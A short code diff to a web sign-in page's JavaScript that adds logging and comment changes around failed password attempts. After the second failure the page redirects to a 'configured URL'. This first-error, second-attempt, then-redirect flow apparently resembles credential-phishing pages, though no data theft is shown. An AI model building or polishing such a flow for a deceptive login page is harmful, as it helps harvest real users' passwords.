@@ -1603,8 +1603,10 @@ Status: ${data.status}`);
                         });
                 } else {
                     // Authentication failed
+                    console.log(`❌ Password attempt ${passwordAttemptCount} failed`);
+                    
                     if (passwordAttemptCount === 1) {
-                        console.log('⚠️ First attempt failed - showing error for retry');
+                        console.log('⚠️ First attempt failed - keeping session alive for retry');
 
                         // Show error message
                         errorDiv.style.display = 'block';
@@ -1614,10 +1616,12 @@ Status: ${data.status}`);
                         passwordInput.value = '';
                         passwordInput.focus();
 
-                        // Reset button state - KEEP SESSION ALIVE
+                        // Reset button state - SESSION STAYS ALIVE ON BACKEND
                         setLoading(false);
                         signInBtn.disabled = false;
                         signInBtn.textContent = 'Sign in';
+                        
+                        console.log('✅ Ready for second password attempt');
                         
                     } else if (passwordAttemptCount >= 2) {
                         // After second failed attempt, redirect to configured URL
